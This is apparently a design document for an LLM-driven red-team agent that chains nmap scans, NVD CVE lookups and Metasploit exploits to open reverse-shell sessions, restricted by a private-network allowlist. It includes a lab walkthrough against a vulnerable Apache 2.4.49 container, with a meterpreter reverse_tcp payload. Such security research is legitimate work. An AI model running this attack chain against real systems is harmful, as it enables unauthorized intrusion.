# BRACE Red Team Agent — Metasploit Integration

## Goal

BRACE already had a "paper" Red Team agent ([Misc_Testing/arena/red_agent.py](Misc_Testing/arena/red_agent.py)) that reads a static `vendor:product:version` file, queries NVD for CVEs, and asks an LLM to produce `msfvenom` command strings. Nothing was actually scanned or launched.

This integration upgrades it to a **live offensive agent** that performs the full attack chain autonomously, driven by an LLM making function calls:

1. **Scan** a network for reachable hosts and open ports (`nmap -sV`).
2. **Fingerprint** externally visible services to extract exact product and version.
3. **Look up CVEs** for the detected versions (NVD API).
4. **Search** the Metasploit Framework module database for matching exploits.
5. **Run** the exploit through `msfrpcd` and catch a reverse-shell session.
6. **Execute** commands inside the session to prove access.

Each step is a plain Python function exposed to the LLM via the existing function-calling plumbing ([Code_For_LLM_Server/llm_client.py](Code_For_LLM_Server/llm_client.py)), so the LLM decides the order and arguments autonomously.

## Architecture

### New package: [Code_For_RTA/offensive_agent/](Code_For_RTA/offensive_agent/)

```
Code_For_RTA/offensive_agent/
├── __init__.py
├── authorization.py        # RFC1918 + RED_TEAM_ALLOWLIST CIDR check
├── nmap_wrapper.py         # python-nmap subprocess wrapper → structured dicts
├── cve_lookup.py           # NVD CVE 2.0 API query for a single product:version
├── metasploit_client.py    # pymetasploit3 wrapper: connect, search, run, sessions
├── session_manager.py      # poll msfrpc sessions for one matching target_host
├── tools_offensive.py      # the 8 LLM-callable tools
└── red_team_agent.py       # RedTeamAgent class: LLM + system prompt + tools
```

### New entry point: [Code_For_RTA/run_red_team.py](Code_For_RTA/run_red_team.py)

CLI wrapper: `python Code_For_RTA/run_red_team.py --target <ip> --lhost <listener> --lport <port>`.

### Reused existing code

| What | Where | Why |
|---|---|---|
| `LLMClient`, `Chat`, `function_to_tool_schema` | [Code_For_LLM_Server/llm_client.py](Code_For_LLM_Server/llm_client.py) | Same OpenRouter tool-calling loop the arena already uses — no changes |
| NVD CVE URL pattern | [Code_For_RTA/payload_generation/checkVulnVersions.py:34](Code_For_RTA/payload_generation/checkVulnVersions.py#L34) | Same endpoint the paper agent queries |
| Config loading | [Code_For_LLM_Server/llm_config.py](Code_For_LLM_Server/llm_config.py) | Extended with `MSF_RPC_*` and `RED_TEAM_ALLOWLIST` |

The existing `arena/` and `arena_openrouter/` modules are **untouched** — the paper-plan agent still runs exactly as before.

## The LLM-callable tool surface

All eight tools live in [Code_For_RTA/offensive_agent/tools_offensive.py](Code_For_RTA/offensive_agent/tools_offensive.py). Each has full type hints and a Google-style docstring so `function_to_tool_schema()` produces a valid OpenAI function schema automatically.

| Tool | Purpose |
|---|---|
| `red_nmap_scan(target, ports)` | Broad `-sV` scan. Allowlist-gated. Returns JSON of discovered services. |
| `red_fingerprint_service(host, port)` | Intensity-9 version probe on one port. Normalizes CPE to `vendor:product:version`. |
| `red_cve_lookup(vendor_product_version)` | NVD CVE lookup. Returns `[{cve_id, description, cvss}]`. |
| `red_search_metasploit_modules(query)` | `msfrpc.modules.search()` by CVE ID or keyword. Returns `[{path, rank, type, disclosure_date, name}]`. |
| `red_run_exploit(module, rhost, rport, payload, lhost, lport, extra_options_json)` | Loads module, sets options, fires exploit, waits 30s for session. Allowlist-gated. |
| `red_list_sessions()` | Enumerates open MSF sessions. |
| `red_execute_in_session(session_id, command)` | Runs a shell/meterpreter command and reads output. |
| `red_full_attack_chain(target, lhost, lport)` | Convenience: runs scan → CVE → module-search in one shot. Does NOT auto-exploit. |

### System prompt

The [`RED_TEAM_SYSTEM_PROMPT`](Code_For_RTA/offensive_agent/red_team_agent.py) tells the LLM the kill-chain order, payload-selection hints (Linux vs Windows), and stopping conditions (once a session lands, run 1–2 ID commands and report).

## Safety

Live exploitation tools are dangerous. All network-touching tools are gated by [authorization.require_allowed()](Code_For_RTA/offensive_agent/authorization.py):

- **Default allowlist**: RFC1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) plus loopback (`127.0.0.0/8`).
- **Extension**: any comma-separated CIDRs in the `RED_TEAM_ALLOWLIST` env var.
- **Targets outside the allowlist** get a plain error string returned to the LLM, which causes the agent to stop (the error is visible in the tool result, so the model backs off rather than retrying).

`red_nmap_scan`, `red_fingerprint_service`, `red_run_exploit`, and `red_full_attack_chain` all enforce this.

## Dependencies

Added to [requirements.txt](requirements.txt):

- `python-nmap>=0.7.1` — parses `nmap -oX` into Python dicts.
- `pymetasploit3>=1.0.3` — XML-RPC client for `msfrpcd`.

Runtime system requirements (not pip-installable):

- `nmap` binary on PATH (`brew install nmap`).
- Metasploit Framework (`brew install --cask metasploit`) — provides `msfrpcd`.

## Configuration

Added to [Code_For_LLM_Server/llm_config.py](Code_For_LLM_Server/llm_config.py), loaded from `.env`:

| Key | Default | Purpose |
|---|---|---|
| `MSF_RPC_HOST` | `127.0.0.1` | Where `msfrpcd` is listening |
| `MSF_RPC_PORT` | `55553` | msfrpcd port |
| `MSF_RPC_USER` | `msf` | RPC username |
| `MSF_RPC_PASS` | (required) | Must match the `-P` flag on `msfrpcd` |
| `MSF_RPC_SSL` | `true` | Set to `false` if you start `msfrpcd` without `-S` |
| `RED_TEAM_ALLOWLIST` | empty | Extra CIDRs beyond RFC1918, comma-separated |

## How to test end-to-end

1. **Install tooling**
   ```bash
   brew install nmap
   brew install --cask metasploit docker
   open -a Docker
   .venv/bin/pip install -r requirements.txt
   ```

2. **Start `msfrpcd`** (leave running in its own terminal)
   ```bash
   msfrpcd -P redteampw -U msf -a 127.0.0.1 -p 55553 -S
   ```

3. **Spin up a vulnerable target** — Apache 2.4.49 (CVE-2021-41773 path traversal → RCE)
   ```bash
   docker run -d --name vulnhttpd -p 8080:80 httpd:2.4.49
   docker exec vulnhttpd sed -i 's|Require all denied|Require all granted|' /usr/local/apache2/conf/httpd.conf
   docker exec vulnhttpd sed -i 's|#LoadModule cgid_module|LoadModule cgid_module|' /usr/local/apache2/conf/httpd.conf
   docker restart vulnhttpd
   ```

4. **Run the agent**
   ```bash
   .venv/bin/python Code_For_RTA/run_red_team.py \
     --target 127.0.0.1 --lhost 127.0.0.1 --lport 4444
   ```

### Expected behavior

The LLM should call tools in roughly this order:

```
red_nmap_scan("127.0.0.1", "1-10000")
  → sees port 8080 running Apache httpd 2.4.49
red_cve_lookup("apache:http_server:2.4.49")
  → returns CVE-2021-41773, CVE-2021-42013, ...
red_search_metasploit_modules("CVE-2021-41773")
  → returns exploit/multi/http/apache_normalize_path_rce
red_run_exploit(
    module="exploit/multi/http/apache_normalize_path_rce",
    rhost="127.0.0.1", rport=8080,
    payload="linux/x64/meterpreter/reverse_tcp",
    lhost="127.0.0.1", lport=4444)
  → session opens
red_list_sessions()
  → [{id: 1, type: "meterpreter", target_host: "127.0.0.1", ...}]
red_execute_in_session(1, "id")
  → "uid=1(daemon) gid=1(daemon) ..."
```

### Negative tests

- Target outside allowlist (e.g., `8.8.8.8`) → `red_nmap_scan` returns `Error: target '8.8.8.8' is outside the authorized scope...`; the LLM stops.
- `msfrpcd` not running → `red_search_metasploit_modules` returns a connect-error string; the LLM reports it and stops.
- Missing `python-nmap` or `pymetasploit3` → tools return `Error running nmap: python-nmap not installed: ...` instead of crashing.

## Scope limits (intentionally out of scope)

- **No arena integration** — the new agent is standalone. A future "live-fire" arena round can wrap `RedTeamAgent` if we want Blue Team to react to real exploits.
- **No post-exploitation** — once a session is open, the agent runs 1–2 ID commands and stops. No persistence, lateral movement, or data exfil.
- **No defensive response** — Blue team still operates on the paper-plan flow in [Misc_Testing/arena/](Misc_Testing/arena/).

## File reference

Created:

- [Code_For_RTA/offensive_agent/__init__.py](Code_For_RTA/offensive_agent/__init__.py)
- [Code_For_RTA/offensive_agent/authorization.py](Code_For_RTA/offensive_agent/authorization.py)
- [Code_For_RTA/offensive_agent/nmap_wrapper.py](Code_For_RTA/offensive_agent/nmap_wrapper.py)
- [Code_For_RTA/offensive_agent/cve_lookup.py](Code_For_RTA/offensive_agent/cve_lookup.py)
- [Code_For_RTA/offensive_agent/metasploit_client.py](Code_For_RTA/offensive_agent/metasploit_client.py)
- [Code_For_RTA/offensive_agent/session_manager.py](Code_For_RTA/offensive_agent/session_manager.py)
- [Code_For_RTA/offensive_agent/tools_offensive.py](Code_For_RTA/offensive_agent/tools_offensive.py)
- [Code_For_RTA/offensive_agent/red_team_agent.py](Code_For_RTA/offensive_agent/red_team_agent.py)
- [Code_For_RTA/run_red_team.py](Code_For_RTA/run_red_team.py)

Modified:

- [requirements.txt](requirements.txt) — added `python-nmap`, `pymetasploit3`.
- [Code_For_LLM_Server/llm_config.py](Code_For_LLM_Server/llm_config.py) — added `MSF_RPC_*` and `RED_TEAM_ALLOWLIST` env pulls.
- [.env](.env) — added `MSF_RPC_HOST/PORT/USER/PASS/SSL`.
